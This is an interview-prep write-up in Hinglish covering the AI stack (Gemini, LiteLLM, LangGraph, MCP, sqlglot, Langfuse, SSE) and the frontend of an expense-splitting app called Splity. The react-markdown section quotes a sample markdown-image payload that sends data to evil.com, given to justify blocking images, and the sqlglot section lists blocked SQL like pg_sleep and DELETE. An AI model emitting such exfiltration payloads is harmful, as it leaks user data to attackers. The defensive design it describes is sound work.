# 3. Technology Deep Dive (Part B: AI stack)

## 3.15 Large Language Models (LLMs) and Google Gemini

**Kya hai:** LLM ek neural network (transformer) hai jo bahut saare text pe train hua hai aur "agla token kya aayega" predict karta hai. Token = word ka tukda. Gemini Google ka multimodal LLM family hai (text + image + audio samajhta hai).

**Key concepts:**

| Term | Simple meaning | Project link |
|---|---|---|
| Prompt / system prompt | Model ko instructions | `prompts.build_system_prompt` |
| Context window | Model ek baar mein kitna padh sakta hai | History 30 messages tak (`load_history(limit=30)`); tool result 8000 chars tak (`MAX_TOOL_RESULT_CHARS`) |
| Temperature | Randomness | Chat 0.1, JSON 0 (drop_params se unsupported ho toh hat jaata hai) |
| Hallucination | Confident galat jawab | Numbers sirf tools se; citations; arithmetic check |
| Function / tool calling | Model structured "call this function" output deta hai | 17 tools |
| Structured output | Model JSON schema follow kare | `complete_json(..., schema)` |
| Multimodal | Image/audio input | OCR (image_url data URL), voice (file data URL) |
| Embeddings | Text -> vector | RAG, SQL few-shot |
| Tokens & cost | Billing unit | `Usage(prompt_tokens, completion_tokens, cost_usd)` |

**Project mein models (config.py):** `llm_model = "gemini/gemini-3.8-flash"`, fallbacks `gemini-3.7-flash`, `gemini-3.6-flash`; embedding `gemini/gemini-embedding-001`. "Flash" = fast + sasta tier.

**Why Gemini:** Ek hi provider se chat, vision, audio aur embeddings; flash models sasti; free tier for development. LiteLLM ki wajah se badalna config change hai (e.g. `anthropic/claude-haiku-4-5` comment mein example).

**Limitations seen in practice (real):** model retire hua (404), newer model ne `temperature` reject kiya, 503 overload, 429 quota exhausted (eval run ke dauraan).

**Interview Q&A**
- **Q: Hallucination kaise kam kiya?** A: (1) Prompt rule "use tools for every number", (2) balances/analytics DB se aate hain, (3) RAG answers citations ke saath aur sirf retrieved data se, (4) OCR total arithmetic se verify, (5) eval mein LLM-judge faithfulness.
- **Q: Temperature 0.1 kyun?** A: Finance app mein consistency chahiye; creativity nahi.

## 3.16 LiteLLM

**Kya hai:** Ek Python library jo 100+ LLM providers ko ek OpenAI-jaisi API (`acompletion`, `aembedding`) ke peeche chhupa deti hai. Cost calculation aur callbacks (logging/observability) bhi deti hai.

**Project mein (`app/ai/llm.py`):**
- `LLMClient` **Protocol** (interface): `stream()`, `complete_json()`, `embed()`. Agent sirf protocol pe depend karta hai - real ya fake client inject ho sakta hai.
- `LiteLLMClient.models` - primary + fallbacks (`dict.fromkeys` se duplicate hatana). Agar explicitly koi model diya (evals), toh fallback nahi - taaki comparison honest rahe.
- `_kwargs()` - API key na ho toh turant `LLMError("GEMINI_API_KEY is not set")` (retries waste nahi); `drop_params=True`; `num_retries = 1`; `timeout = 30s`.
- `stream()` - har model try; chunks collect; `TextDelta` yield; **agar output already user ko dikh gaya aur model fail hua, toh fallback NAHI** (do models ka mixed answer na bane) -> `LLMError`. End mein `stream_chunk_builder` se full response, tool calls parse (`_parse_arguments` invalid JSON ko `__invalid_json__` mark karta hai), `completion_cost` se USD cost.
- `complete_json()` - `response_format={"type":"json_schema", ...}`, temperature 0, fallback loop.
- `embed()` - `aembedding(dimensions=768)` + normalise.
- `configure_langfuse()` - `litellm.success_callback/failure_callback` mein `"langfuse_otel"`.

**Alternatives:** Direct `google-genai` SDK (vendor lock-in), LangChain chat models (heavier abstraction), OpenAI SDK with compatible endpoints.

**Pros:** model-agnostic, fallback, cost tracking, eval mein multiple models compare (`--models a b`). **Cons:** Ek aur dependency layer; provider-specific features kabhi late support; debug logs noisy (`suppress_debug_info`, logger level WARNING in main.py).

**Interview Q&A**
- **Q: Fallback streaming mein tricky kyun hai?** A: Agar model A ne aadha jawab stream kar diya aur fail hua, toh model B se poora naya jawab aayega - user ko do jawab jude hue dikhenge. Isliye `produced_output` flag: output shuru hone ke baad fallback band.
- **Q: Protocol kyun, abstract class kyun nahi?** A: Structural typing - `ScriptedLLM` ko inherit nahi karna padta, bas same methods. Testing aur swapping simple.

## 3.17 AI Agents and tool calling (concept)

**Agent kya hai:** LLM + tools + loop. Model decide karta hai kaunsa tool, server chalata hai, result model ko wapas, model next step decide karta hai, jab tak final answer na aaye.

**Tool calling internal flow:**
1. Request mein `tools=[{type:"function", function:{name, description, parameters(JSON schema)}}]`.
2. Model response mein `tool_calls=[{id, function:{name, arguments(JSON string)}}]`.
3. Server tool chalata hai, result `{"role":"tool","tool_call_id":id,"content":...}` message ke roop mein history mein daalta hai.
4. Model dobara call hota hai.

**Project ki tool design principles (`tools.py` docstring):**
1. **Identity never a tool argument** - har tool `ctx.user` (JWT) ke roop mein chalta hai.
2. **Names, not IDs** - `resolve_person`, `resolve_people`, `resolve_group`; ambiguity -> `ToolError("... Ask the user which one")`.
3. **Two-phase writes** - `prepare` (validate, resolve, summary) aur `execute` (sirf confirm endpoint se, server-stored args ke saath).
4. **Same service layer** as REST.

**17 tools:**

| Type | Tools |
|---|---|
| Read (8 base) | list_friends, find_friends, get_balances, list_expenses, list_groups, get_group, spending_summary, list_notifications |
| Read (AI, 3) | ask_analytics (text-to-SQL), search_documents (RAG), list_receipts |
| Write (5 base) | create_expense, settle_up, create_group, add_friend, post_group_message |
| Write (AI, 1) | split_receipt |

**Name matching (`_match`):** pehle exact (id ya full name), phir first name, phir kisi bhi name part ka prefix. "me/main/mujhe/mera" -> current user (`_SELF_WORDS`, Hinglish included).

## 3.18 LangGraph

**Kya hai:** LangChain team ki library jo agent/workflow ko **state machine graph** ke roop mein define karti hai: nodes (functions), edges (next step), shared state.

**Kyun bana:** Simple while-loop agents mein control (step limits, branching, streaming, persistence) mushkil. Graph explicit aur testable hai.

**Concepts:**
- **State (`AgentState` TypedDict):** `messages`, `steps`, `pending`, `tool_log`, `usage`, `tainted`.
- **Reducers:** `Annotated[list[dict], operator.add]` - node jo list return kare woh **append** hoti hai, replace nahi.
- **Nodes:** `llm_node`, `tools_node`, `give_up_node`.
- **Conditional edges:** `after_llm` (tool_calls hai -> "tools", warna END), `after_tools` (steps < max_steps -> "llm", warna "give_up").
- **Config / configurable:** dependencies (`AgentDeps`: ctx, llm, system_prompt, conversation_id, max_steps) `config["configurable"]["deps"]` se - global state nahi.
- **Stream writer:** `get_stream_writer()` - nodes custom events bhejte hain (`token`, `tool_start`, `tool_end`, `guardrail`).
- **stream_mode=["custom","values"]:** custom events UI ko forward, "values" se latest full state (`final`).
- **recursion_limit:** `4 * max_steps + 5` - LangGraph ka apna safety.

```
START -> llm --(tool calls)--> tools --(steps < 6)--> llm
          |                       \--(steps >= 6)--> give_up -> END
          \--(text answer)--> END
```

**Important behaviour:** `llm_node` mein `tools = None if state.get("pending") else openai_tools()` - proposal banne ke baad model ko tools nahi milte, woh sirf "please confirm" bol sakta hai. Ek turn mein sirf ek write proposal ("Only one change can be proposed at a time").

**Alternatives:** Hand-written loop, LangChain AgentExecutor (legacy), OpenAI Agents SDK, CrewAI/AutoGen (multi-agent, overkill).

**Interview Q&A**
- **Q: LangGraph kyun?** A: Agent flow explicit graph hai - step budget, give-up path, streaming events aur state reducers built-in. Test karna aasan (ScriptedLLM se).
- **Q: Infinite loop kaise roka?** A: `steps` counter + `after_tools` routing to `give_up` after 6, plus LangGraph `recursion_limit`.
- **Follow-up: State mein `usage` aur `tool_log` kyun?** A: Tracing ke liye - har LLM call aur tool ka timing, tokens, cost; end mein `build_spans` se timeline.

## 3.19 Model Context Protocol (MCP) and MCP SDK

**Kya hai:** Anthropic ka open protocol jisse AI clients (Claude Desktop, Cursor, etc.) external tools/data se standard tareeke se connect hon. Server tools expose karta hai (name, description, input schema), client unhe call karta hai. Transport: stdio ya HTTP.

**Project mein (`app/mcp_server.py`, mcp SDK 2.x):**
- `build_server(factory, user_id)` - `MCPServer(name="splity", instructions=...)`; har `ToolSpec` ke liye `_make_handler`.
- `_signature()` - Pydantic args model ko flat keyword parameters mein convert (`inspect.Signature`) taaki MCP client simple schema dekhe.
- `ToolAnnotations(read_only_hint=not spec.mutates, destructive_hint=False)`.
- Auth: `SPLITY_ACCESS_TOKEN` env var (JWT) -> `decode_access_token` -> user_id. `main()` stdio pe run.
- **Writes:** sirf pending action banate hain; **koi "confirm" tool nahi hai** kyunki MCP clients tool calls auto-approve kar sakte hain - model apna change khud confirm na kar sake. User Splity app mein approve karta hai (`GET /api/ai/actions`).
- Test: `tests/integration/test_mcp_server.py` in-memory client.

**Interview Q:** "MCP pe confirm tool kyun nahi diya?" A: Human-in-the-loop tod deta. Confirmation ek alag channel (app UI) mein hona chahiye jahan model ka control nahi.

## 3.20 sqlglot

**Kya hai:** Pure-Python SQL parser/transpiler. SQL string ko AST (Abstract Syntax Tree) mein badalta hai, jise traverse/modify karke wapas SQL bana sakte hain.

**AST simple:** `SELECT SUM(x) FROM t WHERE a = 1` -> Select node -> children: Sum(Column x), From(Table t), Where(EQ(Column a, Literal 1)).

**Project mein (`sql_agent.validate_sql`):**
1. `sqlglot.parse(sql, read="postgres")` - parse error -> `UnsafeSQL`.
2. Exactly one statement.
3. Root `Select | Union | Intersect | Except`.
4. Tree walk: `Insert, Update, Delete, Drop, Create, Alter, Command, Into` -> reject.
5. Har `Table`: CTE names allow; baaki sirf `ALLOWED_TABLES` (4 views), schema '' ya 'analytics'; schema force `analytics`.
6. Har `Func`: `Anonymous` (unknown function like `pg_sleep`) ka naam check; known function ka `sql_name()` allow-list ya `_is_builtin_operator` (Case, Cast, aggregates, date maths, aur operators Binary/Unary/Connector/Predicate).
7. LIMIT na ho ya > 200 -> `tree.limit(max_rows)`.
8. `tree.sql(dialect="postgres")` - normalised SQL.

**Bug jo eval se mila:** sqlglot `AND`, `NOT`, `LIKE` ko `Func` subclasses ki tarah model karta hai, toh "Function 'and' is not allowed" aata tha. Fix: operator base classes ko safe maana; phir verify kiya ki `pg_sleep`, `users` table, `DELETE`, stacked queries ab bhi block hain.

**Why sqlglot vs regex:** Regex comments, nested queries, string literals mein dhoka kha jaata hai; AST exact structure deta hai.

## 3.21 Langfuse and OpenTelemetry

**Kya hai:** Langfuse open-source LLM observability platform (traces, cost, prompts, evals). OpenTelemetry (OTel) traces/metrics bhejne ka vendor-neutral standard.

**Project mein:** `configure_langfuse()` - keys set hon aur package installed ho toh env vars set karke LiteLLM callbacks mein `"langfuse_otel"` add (Langfuse SDK v3+ OTel-based hai). Har LLM call Langfuse mein jaati hai. Saath mein apna `ai_traces` table (Section 4.10).

**Why both:** Apna table offline kaam karta hai, in-app dashboard aur tool/guardrail spans store karta hai; Langfuse industry tool, deep LLM view.

## 3.22 Server-Sent Events (SSE)

**Kya hai:** HTTP ke upar one-way server->client stream. Format: `event: <type>\ndata: <json>\n\n`. WebSocket se simple (normal HTTP, proxies friendly).

**Project mein:** Server `_sse()` (routes/ai.py) events format karta hai. Client `streamChat()` (api.js) - `EventSource` nahi use kiya kyunki `EventSource` POST body aur Authorization header support nahi karta; isliye `fetch` + `ReadableStream` reader + `\n\n` boundary parsing.

**Event types:** `conversation`, `token`, `tool_start`, `tool_end` (with `sql` detail for analytics), `guardrail`, `confirmation`, `done` (message, traceId, tools, usage, promptVersion), `error`.

**Interview Q:** "WebSocket kyun nahi?" A: Chat mein server se client stream chahiye, client har turn naya POST karta hai. SSE simpler, stateless, HTTP caching/proxy friendly. Bi-directional real-time (typing indicators) chahiye hota toh WebSocket.

# 3. Technology Deep Dive (Part C: Frontend)

## 3.23 React 19

**Kya hai:** UI library - components (functions jo JSX return karte hain), state (`useState`), side effects (`useEffect`), context (global state).

**Internal working (simple):** State change -> component re-render -> React virtual tree compare (reconciliation) -> sirf badla hua DOM update.

**Project mein:** Pages in `src/pages`, `AuthContext` for login state, `ChatPage.jsx` (509 lines) - messages state, streaming patch (`patchMessage`), confirmation cards, tool chips, mic, read-aloud.

**Interview Q:** "Streaming tokens se UI kaise update?" A: Har `token` event pe assistant message ka text append karke state update; React re-render karta hai.

## 3.24 Vite 6

**Kya hai:** Frontend dev server + build tool. Dev mein native ES modules (fast start), build mein Rollup.

**Project mein (`vite.config.js`):** port 3000, alias `@ -> src`, **proxy** `/api` aur `/uploads` -> `http://127.0.0.1:5000` (dev mein CORS issue nahi; API uvicorn port 5000 pe chalni chahiye).

## 3.25 React Router 7

`BrowserRouter` + nested routes: `MainLayout` ek layout route hai (sidebar) jiske andar pages render hote hain (`<Outlet/>` pattern). Unknown path -> `/dashboard` redirect.

## 3.26 Tailwind CSS 3, Radix UI, cva, clsx, tailwind-merge

- **Tailwind:** utility classes (`p-4 text-sm`) se styling.
- **Radix UI:** accessible unstyled primitives (dialog, select, tabs, checkbox, avatar).
- **class-variance-authority (cva):** component variants (button sizes/colors).
- **clsx + tailwind-merge:** `utils/cn.js` - classes jodna aur conflicting Tailwind classes merge karna. Yeh "shadcn/ui" pattern hai.

## 3.27 react-markdown

AI replies markdown mein aate hain (bold amounts). `ChatPage.jsx` mein custom components: `img: () => null` (images render hi nahi) aur `a` ko plain text jaisa - **exfiltration defense** (malicious image URL `![x](https://evil.com/?data=...)` browser automatically load kar leta). `rehype-raw` installed hai par use nahi - raw HTML render nahi hota (good).

## 3.28 Recharts and other UI libs

- **Recharts:** AI Ops page (`AIOpsPage.jsx`) charts.
- **sonner:** toast notifications. **lucide-react / heroicons:** icons. **date-fns:** dates.
- **Installed but unused in src:** chart.js, react-chartjs-2, framer-motion, @tanstack/react-table, rehype-raw. Interview mein bolo: "cleanup pending - bundle size kam hoga".

## 3.29 Browser APIs

| API | Kahan | Kya |
|---|---|---|
| `fetch` + `ReadableStream` + `TextDecoder` | `api.js streamChat` | SSE parse |
| `MediaRecorder` + `getUserMedia` | `ChatPage.jsx` | Mic recording (webm) |
| `speechSynthesis` | `ChatPage.jsx` | Reply read-aloud (toggle) |
| `URL.createObjectURL` | `authedBlobUrl` | Auth wali images dikhana |
| `localStorage` | `AuthContext`, `api.js` | token, user, userId |
| `FormData` | `uploadForm` | receipt/audio upload |
